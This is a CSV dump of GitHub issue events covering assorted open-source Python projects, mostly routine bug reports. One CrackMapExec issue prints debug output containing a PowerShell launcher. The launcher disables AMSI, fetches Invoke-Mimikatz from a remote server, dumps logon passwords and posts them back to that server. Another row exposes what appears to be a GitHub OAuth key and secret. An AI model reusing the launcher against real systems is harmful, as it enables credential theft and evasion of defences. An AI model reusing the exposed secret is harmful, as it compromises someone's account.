,type,created_at,repo_id,repo_name,actor_id,actor_login,org_id,org_login,issue_action,issue_title,issue_labels,issue_assignees,issue_count,issue_body,issue_reactions,issue_reason
5159,IssuesEvent,2016-11-25 03:47:04+00:00,27844645,dunovank/jupyter-themes,14892920,sherlockhoatszx,,,opened,fail to reset themes to the system default,[],[],0,"I install the jupyter-themes, and change my jupyternotebook theme to onedork. But i don't like it and want to change to the system default theme. so I use the command sudo jt -r  .that command line works but it seems the theme doesn't change .
the terminal showsL
Reset css and font defaults in:
/home/sherlock/.jupyter/custom &
/home/sherlock/.local/share/jupyter/nbextensions

so ,How can totally reset my themes to the default one ,which one before i install jupterthemes",{},{}
5179,IssuesEvent,2015-11-29 13:55:21+00:00,36964309,jantman/awslimitchecker,273454,jantman,,,closed,Support for API-derived limits,"[{'url': 'https://api.github.com/repos/jantman/awslimitchecker/labels/enhancement', 'name': 'enhancement', 'color': '84b6eb'}, {'url': 'https://api.github.com/repos/jantman/awslimitchecker/labels/unreleased%20fix', 'name': 'unreleased fix', 'color': '0052cc'}]",[],1,"Right now the Limits have support for hard-coded defaults, overrides, and Trusted Advisor source. We need to add an API limit source, like Trusted Advisor, for limits that we get from the APIs. This should be stored in the Limit, used in the limit calculation, and displayed the way TA data is.",{},{}
5190,IssuesEvent,2017-03-02 13:47:19+00:00,12973900,jrief/djangocms-cascade,344493,haricot,,,closed,Way to use basic text editor or add other plugin text editor,[],[],1,"Is it possible to know how can i integrate other text editor (basic editor or such as [djangocms-mediumeditor](
https://github.com/RauliL/djangocms-text-mediumeditor)) and make possible to select in settings without dependance of ckeditor?

Thanks!",{},{}
5198,IssuesEvent,2017-02-08 12:38:21+00:00,23271935,juanpabloaj/slacker-cli,732415,juanpabloaj,,,closed,Coveralls is out of date,[],[],1,"The last run is from 08 Sep 2015:
https://coveralls.io/github/juanpabloaj/slacker-cli

Because:
```
$ coveralls --verbose
Missing .coveralls.yml file. Using only env variables.
Submitting coverage to coveralls.io...
Traceback (most recent call last):
  File ""/home/travis/virtualenv/python2.7.12/bin/coveralls"", line 11, in <module>
    sys.exit(main())
  File ""/home/travis/virtualenv/python2.7.12/lib/python2.7/site-packages/coveralls/cli.py"", line 49, in main
    result = coverallz.wear()
  File ""/home/travis/virtualenv/python2.7.12/lib/python2.7/site-packages/coveralls/api.py"", line 73, in wear
    data = self.create_data()
  File ""/home/travis/virtualenv/python2.7.12/lib/python2.7/site-packages/coveralls/api.py"", line 122, in create_data
    self._data = {'source_files': self.get_coverage()}
  File ""/home/travis/virtualenv/python2.7.12/lib/python2.7/site-packages/coveralls/api.py"", line 130, in get_coverage
    workman._harvest_data()
AttributeError: 'Coverage' object has no attribute '_harvest_data'
```
https://travis-ci.org/juanpabloaj/slacker-cli/jobs/197408045#L200",{},{}
5216,IssuesEvent,2017-09-05 12:58:26+00:00,70798890,logandk/serverless-wsgi,44789,candlerb,,,opened,Non-WSGI code does not work after `sls function deploy -f name`,[],[],0,"I have service which has a WSGI application *and* some regular lambda functions.

The non-WSGI code `api.py` is this:

~~~
# https://github.com/logandk/serverless-wsgi/#automatic-requirement-packaging
import os
import sys
root = os.path.abspath(os.path.join(os.path.dirname(__file__)))
sys.path.insert(0, os.path.join(root, '.requirements'))

import xmltodict

def handler(event, context):
    return xmltodict.unparse({""foo"": ""BAR""})
~~~

serverless.yml:

~~~
functions:
  web:
    handler: wsgi.handler
    events:
      - http: ANY /
      - http: ANY {proxy+}

  api:
    handler: api.handler

custom:
  wsgi:
    app: app.app
~~~

requirements.txt

~~~
xmltodict
~~~

After a full deploy, the non-WSGI code is fine.

~~~
$ sls deploy -v
Serverless: Packaging Python WSGI handler...
Serverless: Packaging required Python packages...
Serverless: Packaging service...
Serverless: Excluding development dependencies...
Serverless: Uploading CloudFormation file to S3...
Serverless: Uploading artifacts...
Serverless: Uploading service .zip file to S3 (2.06 MB)...
...
$ sls invoke -f api -l
""<?xml version=\""1.0\"" encoding=\""utf-8\""?>\n<foo>BAR</foo>""
~~~

However, after redeploying just the function, it fails.

~~~
$ sls deploy function -f api
Serverless: Packaging function: api...
Serverless: Excluding development dependencies...
Serverless: Uploading function: api (2.02 KB)...
Serverless: Successfully deployed function: api
$ sls invoke -f api -l
{
    ""errorMessage"": ""Unable to import module 'api'""
}
--------------------------------------------------------------------
START RequestId: 94f3188a-9239-11e7-8d0e-01bfd0695980 Version: $LATEST
Unable to import module 'api': No module named 'xmltodict'
~~~

Notice how the `sls deploy function` only uploads 2.02KB.

Aside: having a service which has both WSGI and non-WSGI components is quite important to me. Use cases:

1.  I want to bundle an API (directly called by lambda) together with the web interface for managing the API.
2. I want to standardise on serverless-wsgi and not have to use serverless-python-requirements as well
3. I might want to have a WSGI app which also contains handlers for other AWS events, e.g. S3 buckets

(so it would be nice to have first-class support for such functions, so that they don't need to add .requirements to the path themselves)",{},{}
5218,IssuesEvent,2015-08-05 04:56:18+00:00,9376661,lorenzofox3/Smart-Table,2402022,lorenzofox3,,,closed,Select row bug when controller is resetted,[],[],1,"Hello,

The smart-table with ""select one row"" allows the user to select a second row when switching to a different section, and then coming back to the table.

To repro, use [this plunk] (http://plnkr.co/edit/IAbn3i3w2PpgO7RslBGH?p=preview), and:
* Select a row
* Click on ""Section 2""
* Go back to section 1
* Select another row. It gets selected!

The cause is that the `stTableController` restarts, and `lastSelected` is `undefined` when the controller is reset, even though one row is selected.

I haven't found a good solution yet, but will open a PR if I find one I'm satisfied with.

Thanks a lot for this module by the way!",{},{}
5220,IssuesEvent,2015-09-25 14:24:24+00:00,9376661,lorenzofox3/Smart-Table,1016771,parvanova,,,closed,smart table and angular-gettext,[],[],1,"In  my project I use your great Smart-Table module and [angular-gettext] (https://angular-gettext.rocketeer.be/) for translation.
I am facing the following problem:
In the .html file inside the smart table I have
    `<span translate>Show</span>`
so in my translations I have the string ""Show"" translated.
But if I inspect this element in the browser it has become 
   `<span translate><span class=""ng-scope"">Show</span></span>`
and in result the translation doesn't work because there is no string `""<span class=""ng-scope"">Show</span>""`

Can you please advice how to solve it!
Thank you!",{},{}
5224,IssuesEvent,2017-07-05 15:33:45+00:00,9376661,lorenzofox3/Smart-Table,16917568,woodk123,,,opened,items by page - negative numbers break pagination,[],[],0,"Summary
When you set items by page to a negative number the pagination breaks.

Steps to reproduce:
Set items by page to a negative number.
Set to a positive number.
The pagination and number of items displayed does not work any more.

Expected result when set back to positive:
The table displays the correct number of items.

This is broken on your demo site
http://lorenzofox3.github.io/smart-table-website/

And on the project on my machine my machine I'm using:
angular-smart-table 2.1.8
angular 1.5.5",{},{}
5255,IssuesEvent,2017-01-29 20:09:38+00:00,1060073,omab/django-social-auth,91022,omab,,,closed,Google OAUTH2: The access_token is expired or invalid and can't be refreshed.,[],[],2,"I have everything setup for refresh_tokens to work properly, but I have found that after a while they stop working, and then can be fixed by restarting my django application. When I restart my application running in `gunicorn`, the tokens start working again. 

Any ideas on why this is? Does django-social-auth cache somehow? My current solution is to restart my django application with a cron ever 20 minutes, but I would like to find the root cause of the problem.

Here is a stack trace. Any input would be greatly appreciated. Thank you.

```
oauth2==1.5.211
django-social-auth==0.7.25
```

```
The access_token is expired or invalid and can't be refreshed.
Traceback (most recent call last):
  File ""/apps/gcal/signals.py"", line 155, in event_pre_save
    response = service.events().patch(calendarId=calendarId, eventId=instance.eventId, body=event).execute()
  File ""/home/venv/lib/python2.7/site-packages/oauth2client/util.py"", line 128, in positional_wrapper
    return wrapped(*args, **kwargs)
  File ""/home/venv/lib/python2.7/site-packages/apiclient/http.py"", line 676, in execute
    body=self.body, headers=self.headers)
  File ""/home/venv/lib/python2.7/site-packages/oauth2client/util.py"", line 128, in positional_wrapper    return wrapped(*args, **kwargs)
  File ""/home/venv/lib/python2.7/site-packages/oauth2client/client.py"", line 494, in new_request
    self._refresh(request_orig)
  File ""/home/venv/lib/python2.7/site-packages/oauth2client/client.py"", line 811, in _refresh
    'The access_token is expired or invalid and can\'t be refreshed.')
A
```

Update:

When I run `socia.refresh_token()` i get the following error:

```

[05/Sep/2013 11:37:22] ERROR [gcal.views:82] HTTP Error 400: Bad Request
Traceback (most recent call last):
  File ""/apps/gcal/views.py"", line 80, in connect_helper
    social.refresh_token()
  File ""/venv/lib/python2.7/site-packages/social_auth/db/base.py"", line 54, in refresh_token
    response = backend.refresh_token(token)
  File ""/venv/lib/python2.7/site-packages/social_auth/backends/__init__.py"", line 873, in refresh_token
    return cls.process_refresh_token_response(dsa_urlopen(request).read())
  File ""/venv/lib/python2.7/site-packages/social_auth/utils.py"", line 237, in dsa_urlopen
    return urlopen(*args, **kwargs)
  File ""/usr/local/Cellar/python/2.7.3/Frameworks/Python.framework/Versions/2.7/lib/python2.7/urllib2.py"", line 126, in urlopen
    return _opener.open(url, data, timeout)
  File ""/usr/local/Cellar/python/2.7.3/Frameworks/Python.framework/Versions/2.7/lib/python2.7/urllib2.py"", line 406, in open
    response = meth(req, response)
  File ""/usr/local/Cellar/python/2.7.3/Frameworks/Python.framework/Versions/2.7/lib/python2.7/urllib2.py"", line 519, in http_response
    'http', request, response, code, msg, hdrs)
  File ""/usr/local/Cellar/python/2.7.3/Frameworks/Python.framework/Versions/2.7/lib/python2.7/urllib2.py"", line 444, in error
    return self._call_chain(*args)
  File ""/usr/local/Cellar/python/2.7.3/Frameworks/Python.framework/Versions/2.7/lib/python2.7/urllib2.py"", line 378, in _call_chain
    result = func(*args)
  File ""/usr/local/Cellar/python/2.7.3/Frameworks/Python.framework/Versions/2.7/lib/python2.7/urllib2.py"", line 527, in http_error_default
    raise HTTPError(req.get_full_url(), code, msg, hdrs, fp)
HTTPError: HTTP Error 400: Bad Request


```
",{},{}
5257,IssuesEvent,2017-01-29 20:09:46+00:00,1060073,omab/django-social-auth,91022,omab,,,closed,"With socialauth installed, users become inactive when they first become staff or superuser.",[],[],1,"1. Setup new project
2. Create superuser
3. Configure socialauth
4. Create normal user via social login
5. Logout
6. Login to admin as superuser
7. Make social user a superuser or staff

After you save the User model, view it and the active field will be unchecked.

Django==1.5
django-social-auth==0.7.22
",{},{}
5259,IssuesEvent,2015-04-01 15:07:33+00:00,7133153,omab/python-social-auth,830800,johtso,,,opened,Throw a more helpful exception when oauth_consumer_key is missing for OAuth1,[],[],0,"Currently you get this very cryptic traceback:
```
Stacktrace (most recent call last):

  File ""django/core/handlers/base.py"", line 111, in get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File ""newrelic/hooks/framework_django.py"", line 497, in wrapper
    return wrapped(*args, **kwargs)
  File ""django/views/decorators/csrf.py"", line 57, in wrapped_view
    return view_func(*args, **kwargs)
  File ""django/views/generic/base.py"", line 69, in view
    return self.dispatch(request, *args, **kwargs)
  File ""newrelic/hooks/component_djangorestframework.py"", line 27, in _nr_wrapper_APIView_dispatch_
    return wrapped(*args, **kwargs)
  File ""rest_framework/views.py"", line 452, in dispatch
    response = self.handle_exception(exc)
  File ""rest_framework/views.py"", line 449, in dispatch
    response = handler(request, *args, **kwargs)
  File ""rest_framework/decorators.py"", line 50, in handler
    return func(*args, **kwargs)
  File ""api/latest/views.py"", line 1227, in api_social_auth
    user = request.backend.do_auth(token, details=details, request=request)
  File ""social/backends/oauth.py"", line 192, in do_auth
    data = self.user_data(access_token)
  File ""social/backends/twitter.py"", line 37, in user_data
    auth=self.oauth_auth(access_token)
  File ""social/backends/base.py"", line 228, in get_json
    return self.request(url, *args, **kwargs).json()
  File ""social/backends/base.py"", line 221, in request
    response = request(method, url, *args, **kwargs)
  File ""newrelic/api/external_trace.py"", line 124, in dynamic_wrapper
    return wrapped(*args, **kwargs)
  File ""requests/api.py"", line 50, in request
    response = session.request(method=method, url=url, **kwargs)
  File ""requests/sessions.py"", line 450, in request
    prep = self.prepare_request(req)
  File ""requests/sessions.py"", line 381, in prepare_request
    hooks=merge_hooks(request.hooks, self.hooks),
  File ""requests/models.py"", line 308, in prepare
    self.prepare_auth(auth, url)
  File ""requests/models.py"", line 495, in prepare_auth
    r = auth(self)
  File ""requests_oauthlib/oauth1_auth.py"", line 87, in __call__
    unicode(r.url), unicode(r.method), None, r.headers)
  File ""oauthlib/oauth1/rfc5849/__init__.py"", line 304, in sign
    ('oauth_signature', self.get_oauth_signature(request)))
  File ""oauthlib/oauth1/rfc5849/__init__.py"", line 131, in get_oauth_signature
    uri, headers, body = self._render(request)
  File ""oauthlib/oauth1/rfc5849/__init__.py"", line 203, in _render
    request.oauth_params, request.headers, realm=realm)
  File ""oauthlib/oauth1/rfc5849/utils.py"", line 31, in wrapper
    return target(params, *args, **kwargs)
  File ""oauthlib/oauth1/rfc5849/parameters.py"", line 57, in prepare_headers
    escaped_value = utils.escape(value)
  File ""oauthlib/oauth1/rfc5849/utils.py"", line 56, in escape
    'Got %s of type %s.' % (u, type(u)))
```",{},{}
5263,IssuesEvent,2016-12-13 04:14:18+00:00,7133153,omab/python-social-auth,91022,omab,,,closed,python-social-auth template url to jinja template url,[],[],1,"How can i convert this django url tag

`{% url ""social:begin"" ""github"" %}`

to the proper jinja url tag? I have already tried

`{% set myurl=url(""social:begin"", ""github"") %}`

and then use the {{url}}

but i get an

>   ImportError at /login/
> 
> ```
> No module named github
> ```

My settings.py:

```

        UTHENTICATION_BACKENDS = ('social.backends.github.GithubOAuth2',)

        SOCIAL_AUTH_GITHUB_KEY = '75ba4983720f9852c22a'
        SOCIAL_AUTH_GITHUB_SECRET = '7e43083e9ee92bd95ad195064f3aaa91704cbfe0'

        INSTALLED_APPS = [
         'social.apps.django_app.default',
        ]

```

and my urls.py:

.....

```
i18n_urls = [
    url(r'^$', 'zerver.views.home'),
    url('social-auth/', include('social.apps.django_app.urls', namespace='social')),
```

.....
",{},{}
5266,IssuesEvent,2016-12-28 10:00:59+00:00,7133153,omab/python-social-auth,18347883,palzuncoff,,,opened,ImportError: No module named social_django.models,[],[],0,"When i tried makemigrations i take following error

```
Traceback (most recent call last):
  File ""manage.py"", line 22, in <module>
    execute_from_command_line(sys.argv)
  File ""/home/giverroot/django/gve1/lib/python2.7/site-packages/django/core/management/__init__.py"", line 353, in execute_from_command_line
    utility.execute()
  File ""/home/giverroot/django/gve1/lib/python2.7/site-packages/django/core/management/__init__.py"", line 327, in execute
    django.setup()
  File ""/home/giverroot/django/gve1/lib/python2.7/site-packages/django/__init__.py"", line 18, in setup
    apps.populate(settings.INSTALLED_APPS)
  File ""/home/giverroot/django/gve1/lib/python2.7/site-packages/django/apps/registry.py"", line 108, in populate
    app_config.import_models(all_models)
  File ""/home/giverroot/django/gve1/lib/python2.7/site-packages/django/apps/config.py"", line 202, in import_models
    self.models_module = import_module(models_module_name)
  File ""/usr/local/lib/python2.7/importlib/__init__.py"", line 37, in import_module
    __import__(name)
  File ""/home/giverroot/django/gve1/lib/python2.7/site-packages/social/apps/django_app/default/models.py"", line 1, in <module>
    from social_django.models import AbstractUserSocialAuth, UserSocialAuth, Nonce, Association, Code, DjangoStorage
ImportError: No module named social_django.models
```
",{},{}
5269,IssuesEvent,2016-08-07 13:22:47+00:00,7133153,omab/python-social-auth,808659,tyapkov,,,opened,"PSA, break pipeline, ask for password and return back problem",[],[],0,"I am trying to create a minimal working example in which I am breaking Python Social Auth pipeline, ask for new password from the user and return back.

Here is the custom pipeline function:

```
@partial
def get_password(strategy, backend, request, user = None, is_new = False, *args, **kwargs):

    if user:
        if is_new:
            if not request.get('password', None):
                return redirect(""accounts:get_password"")

            user = User.objects.get(email=kwargs['email'])
            user.set_password(request['password'])
            user.save()

    return
```

Here is the view:

```
def get_password(request, template_name='accounts/password_change_form.html',extra_context=None):

    if not extra_context: extra_context = dict()

    if request.method == 'POST':
        form = PasswordForm(request.POST)
        if form.is_valid():
            request.session['password'] = form.cleaned_data['password1']

            backend = request.session['partial_pipeline']['backend']
            return redirect('social:complete', backend=backend)
    else:
        form = PasswordForm()
        extra_context[""form""] = form

    return ExtraContextTemplateView.as_view(template_name=template_name,
                                          extra_context=extra_context)(request)
```

Here is line from settings related to 'password' field:

`SOCIAL_AUTH_FIELDS_STORED_IN_SESSION = ['password',]`

Everything seems to be according to the examples described in PSA docs. The only one difference - it is not working and password saved in session not returned to the pipeline. Please, help, if you have any ideas how to repair it.
",{},{}
5280,IssuesEvent,2017-02-13 10:26:44+00:00,15966619,paradoxxxzero/butterfly,271144,paradoxxxzero,,,closed,[feature request] PAM login,[],[],4,"Please implement pam login. Make the pam profile name an argument.

Users should be able, for example, to enable the 2-factor authentication through PAM. Alternatively, any other customization of the authentication process can be set up in PAM.
",{},{}
5281,IssuesEvent,2017-08-05 15:46:32+00:00,15966619,paradoxxxzero/butterfly,13240849,freedomfury,,,opened,[feature request] Ability to disable sharing sessions,[],[],0,I would like to know how to remove the link form the terminal and disable the functionality completely. I understand that it would be near impossible to guess the session id. However I would like for this feature to be optional. ,{},{}
5303,IssuesEvent,2015-10-04 04:11:45+00:00,1690483,slashmili/python-jalali,585764,slashmili,,,closed,Subtraction is not defined for jdatetime.datetime objects?,[],[],2,"When using the standard library:
```
>>> m = datetime.datetime(2015, 9, 22)
>>> n = datetime.datetime(2014, 9, 22)
>>> m-n
datetime.timedelta(365)
```
but with jdatetime:
```
>>> m = jdatetime.datetime(1394,1,1)
>>> n = jdatetime.datetime(1395,1,1)
>>> m-n
Traceback (most recent call last):
  File ""<pyshell#21>"", line 1, in <module>
    m-n
  File ""C:\Users\a\AppData\Local\Programs\Python\Python35-32\lib\site-packages\jdatetime\__init__.py"", line 753, in __sub__
    raise TypeError(""unsupported operand type(s) for -: '%s' and '%s'""%(type(self), type(timedelta)))
TypeError: unsupported operand type(s) for -: '<class 'jdatetime.datetime'>' and '<class 'jdatetime.datetime'>'
```
I'm using Python 3.5.0 (v3.5.0:374f501f4567, Sep 13 2015, 02:16:59) [MSC v.1900 32 bit (Intel)] on win32",{},{}
5307,IssuesEvent,2016-11-12 14:46:03+00:00,61269270,taspinar/twitterscraper,20492872,ArchibaldArt,,,opened,Error in example code (Readme.md),[],[],0,"Taspinar and Sils, nice job!

A little issue in Readme.md usage example: ""print(tweet.username)"" should be changed to ""print(tweet.user)""",{},{}
5323,IssuesEvent,2018-07-11 10:36:25+00:00,23727790,theskumar/python-dotenv,236356,theskumar,,,closed,Add a `--version` CLI option as per the POSIX standard,[],[],1,"Almost all the CLI tools in the linux/unix world do follow the [POSIX standard](https://www.gnu.org/prep/standards/html_node/Command_002dLine-Interfaces.html) for the CLI args & options. 
And the options like `--version` to print the version and `--help` to print out usage/help information are two of the most common options almost every CLI tool has. 

I think the `dotenv` tool needs this `--version` option too. 
Something like this:
```bash
$ dotenv --version
dotenv v0.6.4
```
Can do a PR for this if needed. 

Thanks.",{},{}
5370,IssuesEvent,2018-04-14 19:06:46+00:00,8490649,Anorov/cloudflare-scrape,17293287,AmaziinqCop,,,opened,Problem bypassing CF,[],[],0,"Error:
Error parsing Cloudflare IUAM Javascript challenge. Cloudflare may have changed their technique, or there may be a bug in the script.
",{},{}
5399,IssuesEvent,2018-02-11 20:17:19+00:00,3491275,WoLpH/python-progressbar,270571,WoLpH,,,closed,Downloading bar even for smallest of sized downloads,[],[],1,"How do I get around this?  I like the simplicity of this library, but is there a way to display loading bar even for small downloads or should I create a rule to only display bar if above a certain size?
",{},{}
5414,IssuesEvent,2016-04-05 02:24:20+00:00,52175332,azazel75/metapensiero.pj,834719,azazel75,,,closed,"Awesome project, want to contribute",[],[],2,"Hello @azazel75 
You have done a great work man, really I mean it. This is an awesome project and I liked it so much. :smile: 
I want to start contributing to this project, are there any particular contributing guidelines, if not what are the highest priorities that need to be solved or added for now, I can help you out with those.

Thanks.",{},{}
5416,IssuesEvent,2018-05-15 06:39:28+00:00,21069841,barnumbirr/coinmarketcap,2029239,barnumbirr,,,closed,Don't pin releases of requirements,[],[],6,"For Home Assistant there is an integration which uses `coinmarketcap`. In the past we were running into issues if a dependency was pinned to a specific release of one of their requirements. 

`coinmarketcap` is pinning `requests==2.18.4` and `requests_cache==0.4.13`. Could you please consider to ease this?

Thanks",{},{}
5431,IssuesEvent,2016-09-29 14:17:28+00:00,40718289,byt3bl33d3r/CrackMapExec,3694988,voidnecron,,,opened,sys.excepthook is missing,[],[],0,"## Steps to reproduce

1. Fresh installed Kali 2016.2 amd64. Updated fully with apt-get update, upgrade, dist-upgrade.
2. Followed steps for installing via virtualenvwrapper
3. ???
4. Profit not so much, crashes out with:
(CME) root@kali:~# crackmapexec 10.0.2.15
09-29-2016 16:06:03 [*] First time use detected
09-29-2016 16:06:03 [*] Creating home directory structure
09-29-2016 16:06:03 [*] Initializing the database
09-29-2016 16:06:03 [*] Copying default configuration file
09-29-2016 16:06:03 [*] Generating SSL certificate
09-29-2016 16:06:03 [*] KTHXBYE!
Unhandled exception in thread started by 
sys.excepthook is missing
lost sys.stderr
(CME) root@kali:~# crackmapexec 10.0.2.15
09-29-2016 16:06:15 [*] KTHXBYE!
Unhandled exception in thread started by 
sys.excepthook is missing
lost sys.stderr
(CME) root@kali:~# crackmapexec 10.0.2.15 -u administrator -p Pa$$w0rd
09-29-2016 16:06:45 [*] KTHXBYE!
Unhandled exception in thread started by 
sys.excepthook is missing
lost sys.stderr


## Command string used
See above output

## CME verbose output (using the --verbose flag)
Even less output with verbose flag.

## OS
Kali 2016.2

## Target OS
Win7, Win10

## Detailed issue explanation
Not sure, I'm not a dev, mearly opssec curious.",{},{}
5433,IssuesEvent,2018-03-01 19:00:21+00:00,40718289,byt3bl33d3r/CrackMapExec,5151193,byt3bl33d3r,,,closed,NameError: global name 'format_exc' is not defined,[],[],3,"## Steps to reproduce

1. Run CrackMapExec with module mimikatz and --local-auth and NTLM-relaying in an AD

## Command string used
cme smb <IP Address> -u admin -H <hash> --local-auth -M mimikatz
OR cme smb <IP Address> -u admin -H <hash> --local-auth -x whoami

## CME verbose output (using the --verbose flag)

> DEBUG Passed args:
> {'clear_obfscripts': False,
>  'content': False,
>  'cred_id': [],
>  'darrell': False,
>  'depth': None,
>  'disks': False,
>  'domain': None,
>  'exclude_dirs': '',
>  'exec_method': None,
>  'execute': None,
>  'fail_limit': None,
>  'force_ps32': False,
>  'gen_relay_list': None,
>  'gfail_limit': None,
>  'groups': None,
>  'hash': ['<hash>'],
>  'jitter': None,
>  'list_modules': False,
>  'local_auth': True,
>  'local_groups': None,
>  'loggedon_users': False,
>  'lsa': False,
>  'module': 'mimikatz',
>  'module_options': [],
>  'no_output': False,
>  'ntds': None,
>  'obfs': False,
>  'only_files': False,
>  'pass_pol': False,
>  'password': [],
>  'pattern': None,
>  'port': 445,
>  'protocol': 'smb',
>  'ps_execute': None,
>  'regex': None,
>  'rid_brute': None,
>  'sam': False,
>  'server': 'https',
>  'server_host': '0.0.0.0',
>  'server_port': None,
>  'sessions': False,
>  'share': 'C$',
>  'shares': False,
>  'show_module_options': False,
>  'spider': None,
>  'spider_folder': '.',
>  'target': ['<IP Address>'],
>  'threads': 100,
>  'timeout': None,
>  'ufail_limit': None,
>  'username': ['itadmin'],
>  'users': None,
>  'verbose': True,
>  'wmi': None,
>  'wmi_namespace': 'root\\cimv2'}
> DEBUG CME server type: https
> SMB         <IP Address>    445    <domain>    [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:<domain>) (domain:<domain>) (signing:False) (SMBv1:True)
> DEBUG add_credential(credtype=hash, domain=<domain>), username=admin, password=<hash>, groupid=None, pillaged_from=None) => None
> SMB         <IP Address>     445    <domain>    [+] <domain>\admin <hash> (Pwn3d!)
> DEBUG Generated PS IEX Launcher:
>  [Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
> IEX (New-Object Net.WebClient).DownloadString('https://<Local IP Address>:443/Invoke-Mimikatz.ps1')
> $cmd = Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords exit'
> $request = [System.Net.WebRequest]::Create('https://<Local IP Address>:443/')
> $request.Method = 'POST'
> $request.ContentType = 'application/x-www-form-urlencoded'
> $bytes = [System.Text.Encoding]::ASCII.GetBytes($cmd)
> $request.ContentLength = $bytes.Length
> $requestStream = $request.GetRequestStream()
> $requestStream.Write($bytes, 0, $bytes.Length)
> $requestStream.Close()
> $request.GetResponse()
> 
> DEBUG Generated PS command:
>  [Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
> try{
> [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true)
> }catch{}
> [Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
> IEX (New-Object Net.WebClient).DownloadString('https://<Local IP Address>:443/Invoke-Mimikatz.ps1')
> $cmd = Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords exit'
> $request = [System.Net.WebRequest]::Create('https://<Local IP Address>:443/')
> $request.Method = 'POST'
> $request.ContentType = 'application/x-www-form-urlencoded'
> $bytes = [System.Text.Encoding]::ASCII.GetBytes($cmd)
> $request.ContentLength = $bytes.Length
> $requestStream = $request.GetRequestStream()
> $requestStream.Write($bytes, 0, $bytes.Length)
> $requestStream.Close()
> $request.GetResponse()
> 
> DEBUG Error executing command via wmiexec, traceback:
> Traceback (most recent call last):
>   File ""/usr/lib/python2.7/dist-packages/gevent/greenlet.py"", line 536, in run
>     result = self._run(*self.args, **self.kwargs)
>   File ""/usr/local/lib/python2.7/dist-packages/crackmapexec-4.0.1.dev0-py2.7.egg/cme/protocols/smb.py"", line 108, in __init__
>     connection.__init__(self, args, db, host)
>   File ""/usr/local/lib/python2.7/dist-packages/crackmapexec-4.0.1.dev0-py2.7.egg/cme/connection.py"", line 41, in __init__
>     self.proto_flow()
>   File ""/usr/local/lib/python2.7/dist-packages/crackmapexec-4.0.1.dev0-py2.7.egg/cme/connection.py"", line 75, in proto_flow
>     self.call_modules()
>   File ""/usr/local/lib/python2.7/dist-packages/crackmapexec-4.0.1.dev0-py2.7.egg/cme/connection.py"", line 105, in call_modules
>     self.module.on_admin_login(context, self)
>   File ""/usr/local/lib/python2.7/dist-packages/crackmapexec-4.0.1.dev0-py2.7.egg/cme/modules/mimikatz.py"", line 34, in on_admin_login
>     connection.ps_execute(launcher)
>   File ""/usr/local/lib/python2.7/dist-packages/crackmapexec-4.0.1.dev0-py2.7.egg/cme/connection.py"", line 17, in _decorator
>     return func(self, *args, **kwargs)
>   File ""/usr/local/lib/python2.7/dist-packages/crackmapexec-4.0.1.dev0-py2.7.egg/cme/protocols/smb.py"", line 445, in ps_execute
>     return self.execute(create_ps_command(payload, force_ps32=force_ps32, dont_obfs=dont_obfs), get_output, methods)
>   File ""/usr/local/lib/python2.7/dist-packages/crackmapexec-4.0.1.dev0-py2.7.egg/cme/connection.py"", line 17, in _decorator
>     return func(self, *args, **kwargs)
>   File ""/usr/local/lib/python2.7/dist-packages/crackmapexec-4.0.1.dev0-py2.7.egg/cme/protocols/smb.py"", line 81, in _decorator
>     output = func(self, *args, **kwargs)
>   File ""/usr/local/lib/python2.7/dist-packages/crackmapexec-4.0.1.dev0-py2.7.egg/cme/protocols/smb.py"", line 394, in execute
>     logging.debug(format_exc())
> NameError: global name 'format_exc' is not defined
> Thu Nov 30 14:01:29 2017 <Greenlet at 0x7f85d4095b90: smb(Namespace(clear_obfscripts=False, content=False, c, <protocol.database instance at 0x7f85d4a2e320>, '<IP Address>')> failed with NameError

## CME Version (cme --version)
4.0.1dev - Bug Pr0n

## OS
Kali Linux latest updated

## Target OS
Windows 7 Professional 7601 Service Pack 1 x64

## Detailed issue explanation
",{},{}
